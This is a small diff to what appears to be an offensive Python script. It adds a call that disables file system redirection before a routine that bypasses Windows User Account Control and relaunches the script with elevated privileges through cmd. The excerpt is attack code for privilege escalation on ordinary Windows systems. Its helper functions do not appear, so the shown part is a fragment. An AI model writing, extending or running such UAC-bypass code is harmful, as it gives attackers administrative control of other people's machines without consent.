@@ -62,6 +62,7 @@ def execute():
         print('[!] The script is NOT running with administrative privileges')
         print('[+] Trying to bypass the UAC')
         try:
+            disable_file_system_redirection()
             current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
             cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
             bypass_uac(cmd)
